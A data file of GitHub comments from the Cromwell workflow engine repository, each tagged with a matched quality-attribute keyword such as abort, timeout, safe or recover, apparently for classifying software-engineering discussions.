Safety,"If I recall correctly, it was proposed to not follow this route because the state consisted of the child workflow actor references in it, and was used to kill (or maybe abort) the workflow it was executing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-236298310:169,abort,abort,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-236298310,1,['abort'],['abort']
Safety,"If this sounds like a good idea, we probably may be needing more discussions in terms of handling cases like `AbortAllWorkflows`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-200579236:110,Abort,AbortAllWorkflows,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-200579236,1,['Abort'],['AbortAllWorkflows']
Safety,"If this ticket is about what I think it is (picking up jobs that were running when Cromwell is restarted), I think this ticket should be ""Recover Support"". I believe ""retry"" describes Cromwell's resilience to transient failures with Google Cloud services.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/749#issuecomment-217901703:138,Recover,Recover,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/749#issuecomment-217901703,1,['Recover'],['Recover']
Safety,"Ignore my redundant self-approval of this PR. I intended to click ""merge"" but apparently the green ""Approve"" button was too tempting for me not to click on first",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959:10,redund,redundant,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6374#issuecomment-868768959,1,['redund'],['redundant']
Safety,"In addition to the akka migration docs, and the commented out implicit compilation error, there a several new compilation warnings / recommendations that appeared with this change. They each look straightforward enough to fix and quiet, in a following PR or this PR. While we're in there, perhaps we can also use [`""com.timushev.sbt"" % ""sbt-updates""`](https://github.com/rtimush/sbt-updates) to update our other dependencies in cromwell, lenthall, and wdl4s, too. Btw, the explicit form that compiles your implict error:. ``` scala; val futureAny = actorRef.?(message)(timeout = timeout, sender = actorRef); ```. Switch `timeout` and `actorRef` with whatever `implicit val` you intended, but those were the closest in scope from `trait DefaultTimeout` and the enclosing method parameters, respectively.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1370#issuecomment-244788823:569,timeout,timeout,569,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1370#issuecomment-244788823,3,['timeout'],['timeout']
Safety,"In fact, I now have more running jobs than I had when I issued the abort signal.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-254901155:67,abort,abort,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-254901155,1,['abort'],['abort']
Safety,"In order to fix the coverage I am willing to write tests. But I need some explanation on how to configure the cromwell that is used by centaur, so I can set `exit-code-timeout-seconds`. Can somebody give me that? Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-496377749:168,timeout,timeout-seconds,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-496377749,1,['timeout'],['timeout-seconds']
Safety,"Is the idea that we can sum up the jobs run per group and then we have the total # of jobs running?. I think this is sufficient, but I'd still like to add logging to job token manager in addition to this, even if nothing more than a sanity check on the numbers we're seeing here. Assuming the first part is true, by all means merge!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4567#issuecomment-457693674:233,sanity check,sanity check,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4567#issuecomment-457693674,1,['sanity check'],['sanity check']
Safety,"Is there a typo in the better behavior? Should the job continue WITH; relocalizing (since the input.bam file is partially copied?. On Fri, Sep 16, 2016 at 11:20 AM, kshakir notifications@github.com wrote:. > The zeroth localizers checks to see if a file exists before re-localizing.; > The copy localizer should therefore copy-to-temp-then-rename.; > ; > Current broken behavior:; > - Run SGE task with a large input.bam and copy localization; > - Cromwell starts copying to <call_root>/input.bam; > - Kill the job during localization; > - Restart cromwell; > - Cromwell detects the partial <call_root>/input.bam exists.; > - The job continues without relocalizing.; > ; > Better behavior:; > - Run SGE task with a large input.bam and copy localization; > - Cromwell starts copying to <call_root>/input.bam.tmp; > - Kill the job during localization; > - Restart cromwell; > - Cromwell doesn't detects the partial <call_root>/input.bam exists.; > - The job continues without relocalizing.; > ; > And when cromwell isn't killed:; > - Run SGE task with a large input.bam and copy localization; > - Cromwell starts copying to <call_root>/input.bam.tmp, ensuring to; > overwrite previous results; > - When copying finishes rename <call_root>/input.bam.tmp to; > <call_root>/input.bam; > - The job continues; > ; > NOTE: Most people do not like copying inputs anyway, so this hasn't been a; > major issue.; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1426, or mute the; > thread; > https://github.com/notifications/unsubscribe-auth/ABW4g1ZnxF4tyJPhaY4gsjrShn6qz9Vyks5qqrOxgaJpZM4J_DUj; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1426#issuecomment-247630452:571,detect,detects,571,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1426#issuecomment-247630452,2,['detect'],['detects']
Safety,Is this kind of redundant to the token system?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370562042:16,redund,redundant,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370562042,1,['redund'],['redundant']
Safety,"Is this to account for things that are ""provider-dependent"" as described in the [FileSystems JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/nio/file/FileSystems.html)? I'm curious exactly what behavior you saw, such as `getFileSystem` returning a reference to a closed file system or throwing `FileSystemNotFoundException`. I think it's worth having a link to any documentation that describes any provider-dependent behavior or documenting our observations ourselves. I'm also still contemplating that potential gap between `getFileSystem` and `newFileSystem`. I'd love to avoid adding our own synchronization around this, but I guess that really depends on how the blob filesystem behaves and what failure modes look like and how we want to handle them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457:582,avoid,avoid,582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6816#issuecomment-1204475457,1,['avoid'],['avoid']
Safety,"It allows a user to understand that they're requesting to abort something which is already terminal. Whether or not that's useful is a matter of debate. Clearly someone does because it was put in by someone. I say that it's ""useful"" but am using quotes because I doubt anyone is ever going to act on knowledge. I don't recall if it returns 200 or just a generic error (I could dig it up if it matters, but not now as I don't have the energy and I don't think we should keep it)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332683379:58,abort,abort,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332683379,1,['abort'],['abort']
Safety,It seems that @TMiguelT has already addressed part of [this issue](https://github.com/hpcng/singularity/issues/2597). . The singularity cache is not meant as a replacement for storing your images. It is merely meant as a way to avoid downloading too much. . It seems we have to hack something together in bash or contribute something upstream. I think bash hacking can be fairly succesful but it will be very ugly. The requirements for the cache:; * Make use of singularity's layer cache to avoid too much downloading.; * Should be thread safe. Singularity 3.6.0 commands will use a threadsafe cache. Older version will have to use a universal file lock.; * Will put all `.sif` images in a single shared location.; * Will check if a file exists before pulling. This will mean a cache-first approach. Internet outages should not affect workflows that have already run several times.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631402844:228,avoid,avoid,228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631402844,3,"['avoid', 'safe']","['avoid', 'safe']"
Safety,"It was taking 12-14 seconds between the time the GetStatus message was received by the ServiceRegistryActor and the time it was received by the EngineMetadataServiceActor. All sorts of other test stuff was executing in the interim, but the timeout for status queries previously defaulted to 10 seconds so that wasn't going to work. Added an explicit ~~30~~ 60 second ~~dilated~~ timeout as in many other spots.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1057#issuecomment-227978006:240,timeout,timeout,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1057#issuecomment-227978006,2,['timeout'],['timeout']
Safety,"It will take me a while to dig up an online reference (googling java thread safety returns a ton of results to sort through). But creating one's own private lock is an extra level of paranoia, kind of like marking all java variables as `final`, or reducing the scope of classes to `private`. If one uses `this` as a mutex, then others can actually steal your lock, by locking **you**. ```scala; object LiquibaseUtils {; def echoQuick = {; this.synchronized {; println(""hello""); }; }; }. object ForeignImplementation {; LiquibaseUtils.synchronized {; // I have your lock!; Thread.sleep(1.day.toMillis); }; }; ```. If however the synchronization is done on a private variable, it can never be shared by outside participants. ```scala; object LiquibaseUtils {; private val cantTouchThis = new Object; def echoQuick = {; cantTouchThis.synchronized {; println(""hello""); }; }; }. object ForeignImplementation {; LiquibaseUtils.synchronized {; // Doesn't affect echoQuick; Thread.sleep(1.day.toMillis); }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439099381:76,safe,safety,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439099381,1,['safe'],['safety']
Safety,"It would be a nice feature, particularly for folks with a single large box,; but it is not something that I see myself using regularly, to be honest. On Fri, Sep 29, 2017 at 5:16 PM, Kate Voss <notifications@github.com> wrote:. > @seandavi <https://github.com/seandavi> are you still interested in being; > able to limit CPU and memory when running on local?; > @geoffjentry <https://github.com/geoffjentry> what would be the effort; > and risk for adding these parameters?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333241117>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AAFpE2iSooOX2P5Vj9bQYMoikzonywc7ks5snV4YgaJpZM4N9Ob6>; > .; >. -- ; Sean Davis, MD, PhD; Center for Cancer Research; National Cancer Institute; National Institutes of Health; Bethesda, MD 20892; https://seandavi.github.io/; https://twitter.com/seandavis12",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333242232:440,risk,risk,440,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333242232,1,['risk'],['risk']
Safety,"It would be a really nice to have feature indeed!. In addition to what was said above, we're also planning to work on runtime metrics reporting at DSP hackathon with @mohawkTrail and @rexwangcc . In the future, the ""automatic retry"" feature could enable us to collect runtime statistics much more easily (in a fully automated fashion). From this, we could then build accurate models on how much resources are actually needed, for a given set of inputs (so we could predict the amount of resources for future workflows, instead of relying on guesswork or retries). Without this feature, we have to either overshoot the amount of resources uniformly for all tasks (and then collect how much they actually need), or somehow retry this in a ""ladder"" fashion using an automated script that does a ""parameter sweep"" that we then pass to our workflow as inputs (or directly edit using something like MiniWDL perhaps?).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5017#issuecomment-515629279:465,predict,predict,465,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5017#issuecomment-515629279,1,['predict'],['predict']
Safety,"It's hard to say what the impact is, right now it is likely an annoyance. - Effort: **Medium**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1413#issuecomment-325650373:98,Risk,Risk,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1413#issuecomment-325650373,1,['Risk'],['Risk']
Safety,It's not likely this will be worked on as the dev team has no experience with proxies nor one to test against. Can you have your corporate IT allowlist Docker? It seems like it would be a popular and non-risky request.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-1421492972:204,risk,risky,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-1421492972,1,['risk'],['risky']
Safety,"It's working as expected at least, Cromwell does not abort running jobs when a workflow fails. It just stops tracking them and fails the workflow without starting new jobs.; `ContinueWhilePossible` makes Cromwell continue to start new jobs ""while possible"" even if some jobs have failed.; In neither case does Cromwell abort running jobs when the workflow fails though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320298013:53,abort,abort,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320298013,2,['abort'],['abort']
Safety,"It’s still using the old 10-second timeout, so it seems like this build’s branch probably diverted from develop prior to the timeout commit landing. > On Aug 31, 2018, at 15:46, Thib <notifications@github.com> wrote:; > ; > Didn't @aednichols increase the timeout for that very recently ?; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub, or mute the thread.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-417777979:35,timeout,timeout,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-417777979,3,['timeout'],['timeout']
Safety,"Just as a safety measure, maybe we should consider add a config option called something like ""allowCrossFSLocalisation"" - just to avoid accidentally downloading a 500GB file from GCS and the costs involved?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161010494:10,safe,safety,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161010494,2,"['avoid', 'safe']","['avoid', 'safety']"
Safety,"Just to clarify, I think the motivation here was to make sure the workflow that went terminal does not get recovered and a job that already ran once gets re-run.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1247#issuecomment-304958771:107,recover,recovered,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1247#issuecomment-304958771,1,['recover'],['recovered']
Safety,"Let's talk after standup. I think we're going to need it - IIRC there's already something incorrectly reading/writing from metadata, and recovery was the use case which informed it in the first place & that's incoming",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1031#issuecomment-227760284:137,recover,recovery,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1031#issuecomment-227760284,1,['recover'],['recovery']
Safety,"Looking closer at the specific problem @abaumann reported, it appears to just be workflow level mismatches and aborting - I'll fix just those first and we'll see if the problems are deeper than that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/940#issuecomment-224394911:111,abort,aborting,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/940#issuecomment-224394911,1,['abort'],['aborting']
Safety,Looking forward to this feature. When enabled the `check-alive` command call via `exit-code-timeout-seconds` currently polls on average once every 10 seconds per running job (under minimum load).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-431870949:92,timeout,timeout-seconds,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-431870949,1,['timeout'],['timeout-seconds']
Safety,"Looks good to me. I tried to make some sense of this compiler error this morning. One thing to note is that `sbt compile` does work, but it's the assembly that seems to be creating the issues. Judging from the output of `sbt assembly`, I think perhaps it could be a conflict with another library, because it seems to have the error immediately after importing a bunch of JARs:. ```; ...; [info] Including: jackson-jaxrs-json-provider-2.4.1.jar; [info] Including: jackson-module-jsonSchema-2.4.1.jar; [info] Including: jackson-jaxrs-base-2.4.1.jar; [error] missing or invalid dependency detected while loading class file 'WorkflowStatusResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowStatusResponse.class' was compiled against an incompatible version of scala.; [error] missing or invalid dependency detected while loading class file 'WorkflowSubmitResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowSubmitResponse.class' was compiled against an incompatible version of scala.; [error] two errors found; [error] (test:compileIncremental) Compilation failed; [error] Total time: 32 s, completed Jun 2, 2015 8:39:34 AM; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395:586,detect,detected,586,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395,2,['detect'],['detected']
Safety,"Looks like Chris has suggested some substantial changes, will wait to review when those land (avoid race condition)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981:94,avoid,avoid,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981,1,['avoid'],['avoid']
Safety,"Looks like it issues a SIGTERM by default: https://www.ctl.io/developers/blog/post/gracefully-stopping-docker-containers/. However the timeout for docker will be shorter than cromwell's, so we should still document how to change *that* (`docker stop ----time=30 foo`) and thus I'm not closing this like I just said I would.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2562#issuecomment-323794220:135,timeout,timeout,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2562#issuecomment-323794220,1,['timeout'],['timeout']
Safety,Looks like this PR didn't catch the test timeout increases for some reason 🤔,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570559229:41,timeout,timeout,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570559229,1,['timeout'],['timeout']
Safety,Looks like we now have `504 Gateway Timeout` errors too! Should we perhaps add a new case for that?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5321#issuecomment-572676517:36,Timeout,Timeout,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5321#issuecomment-572676517,1,['Timeout'],['Timeout']
Safety,"Made redundant by a recent change to the test expectations. Closing this ""now just whitespace"" PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692:5,redund,redundant,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692,1,['redund'],['redundant']
Safety,Maybe you should use Long as internal cromwell wdl-Int representation to avoid such type of bugs?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2744#issuecomment-336553801:73,avoid,avoid,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2744#issuecomment-336553801,1,['avoid'],['avoid']
Safety,"Modify the `script-epilogue` to remove the sync operation. I also encountered the sync problem, and removing sync has not caused any identifiable issues. Cromwell will not start dependent jobs until the rc file is written to disk by the job and polled Cromwell, so I suspect this is safe. . See:; https://gatkforums.broadinstitute.org/wdl/discussion/9368/how-difficult-would-it-be-to-get-cromwell-working-on-slurm",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4347#issuecomment-435468022:283,safe,safe,283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4347#issuecomment-435468022,1,['safe'],['safe']
Safety,"More info:; - Again `WdlFile` is allowing a directory to slip in, while this isn't technically supported. For another example see #1935, and others I cannot locate at the moment.; - With an input file of `""""`, this directory equates to the present working directory.; - Cromwell is attempting to localize the whole directory.; - hard-link to a directory always fails, and since this is docker, soft-link isn't available.; - Cromwell is then copying everything in the pwd. Note, this includes everything under `cromwell-executions`, so it could be potentially large.; - Issuing a Control-C at this point doesn't interrupt the copy localization. I'm not sure how we'll implement aborting copying.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1954#issuecomment-282575488:677,abort,aborting,677,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1954#issuecomment-282575488,1,['abort'],['aborting']
Safety,"More people are using the JG server to launch multiple workflows w/ jobs on the order of 10k and it's being slow to start those jobs. There's definitely something going on w/ memory still but one explanation is also that jobs are being queued and throttled in Cromwell to respect quota for submission which is good, but if we have tens of thousands it might take some time to start them. Jose submitted a 40k jobs workflow and aborted it almost immediately and it got me thinking that *if* they were in that queue they would still be submitted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2750#issuecomment-336873648:427,abort,aborted,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2750#issuecomment-336873648,1,['abort'],['aborted']
Safety,"Most of these issues are complete so I am going to add the remaining one, #637, to the [Abort Spec](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1625#issuecomment-325468218:88,Abort,Abort,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1625#issuecomment-325468218,1,['Abort'],['Abort']
Safety,"My ""test"" right now is the following code in a Scala worksheet:; ```; import scala.concurrent.{ExecutionContext, Future}. implicit val ec = ExecutionContext.global. val x = Future(throw new Exception(""hello world"")). val y = x.map(_ => println(""wasd""))(ec); .recover { case a: Throwable => println(""Exception was: "" + a.getMessage) }(ec); ```; which prints; ```; Exception was: hello world; ```; I'm working on figuring out how construct this in situ in a way that meaningfully tests something.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5022#issuecomment-501411862:259,recover,recover,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5022#issuecomment-501411862,1,['recover'],['recover']
Safety,NB you can also use `[force ci]` in a commit message to avoid having to create multiple PRs just to see tests run,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475:56,avoid,avoid,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475,1,['avoid'],['avoid']
Safety,"Nevermind, just noticed some failures due to Docker rate-limiting, which I would love to completely avoid. I'm going to try installing Vault directly rather than using Docker.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603:100,avoid,avoid,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603,1,['avoid'],['avoid']
Safety,"Nice and terse, though unfortunately not terse enough to avoid the dreaded rebase.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/47#issuecomment-112246577:57,avoid,avoid,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/47#issuecomment-112246577,1,['avoid'],['avoid']
Safety,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:33,abort,abort,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466,5,"['Abort', 'abort']","['Aborted', 'abort']"
Safety,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:319,timeout,timeouts,319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991,3,['timeout'],"['timeout', 'timeouts']"
Safety,Not 100% sure there's a locking issue in this case as there should be only one Cromwell processing the append-only abort request and at most one Cromwell running an abortable workflow?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3344#issuecomment-370523886:115,abort,abort,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3344#issuecomment-370523886,2,['abort'],"['abort', 'abortable']"
Safety,"Not 100% sure what wasn't working at what point. I suspect that based on the order of the original commits<sup>1</sup>, the `RunMysql` and server should have both worked at ""4."". At that point I believe the config `url` still contained `useSSL=true`, the application config was being passed on the command line, and the mysql jdbc code should have been in the main assembly. By the time I was running ""11."" earlier today, the configuration `url` no longer contained `useSSL=true`, and connections within `SlickDataAccess` were returning the error combo:. ```; java.sql.SQLTimeoutException: Timeout after 1000ms of waiting for a connection.; ...; Caused by: java.sql.SQLException: Access denied for user '…'@'…' (using password: YES); ```. I did add another variable in ""11."" by always testing with `useSSL=true&requireSSL=true`, but according to the [logs](http://pastebin/209) of the latest 'RunMysql', `jdbcMain` and `jdbcRequireSsl` passed. So that _shouldn't_ have changed the results. Meanwhile, all test combinations of setting ssl worked for both slick and raw datasource connections, in tests via the url (*Ssl*), or via the dataSource properties (*Prop). So I think just setting back the `useSSL=true` is the minimum required fix, but I'd prefer to see `requiredSSL=true` added as well, as was successfully run in `slickSslDriver`. <sup>1</sup> What I believe is the previous order of the commits:; 1. Updated run.sh to pass in the mysql key & trust stores.; 2. log database config; 3. make mysql not test-only; 4. Add config file option in run.sh to make container use custom configuration; 5. debugging ""script""; 6. log actual uniquified config; 7. Test at JDBC level.; 8. hardcode use of SSL; 9. count rows in WORKFLOW_EXECUTION; 10. Logging the just the URL in SlickDataAccess, not the entire config.; 11. Added a suite of mysql ssl test.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815:590,Timeout,Timeout,590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815,1,['Timeout'],['Timeout']
Safety,"Not sure, we can err on the side of safety and do just the group for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5527#issuecomment-637798466:36,safe,safety,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5527#issuecomment-637798466,1,['safe'],['safety']
Safety,"Note: I labelled this ""paranoia"" because even without the `Try`, the test passed consistently. - Maybe this is already protected against elsewhere; - Maybe the test isn't testing the right thing; - Maybe I just got (un)lucky when I ran it. Either way, it doesn't seem like a *bad* thing to be safe in case `take` throws an exception.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4165#issuecomment-425139204:293,safe,safe,293,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4165#issuecomment-425139204,1,['safe'],['safe']
Safety,"OK to all suggestions except the 405 for attempted aborts on terminal workflows. I've only seen that used for inappropriate HTTP verbs, which Spray should already be checking before it gets to our business logic. FYI there's some interesting work being done by the Rawls team to get the Swagger noise out of the code, although it seems to remain as un-DRY as ever:. https://github.com/broadinstitute/rawls/pull/63/files",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/114#issuecomment-125936775:51,abort,aborts,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/114#issuecomment-125936775,1,['abort'],['aborts']
Safety,"Oh nm, it looks like #751 is the Recover ticket. Is this the preemptibility ticket?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/749#issuecomment-217903096:33,Recover,Recover,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/749#issuecomment-217903096,1,['Recover'],['Recover']
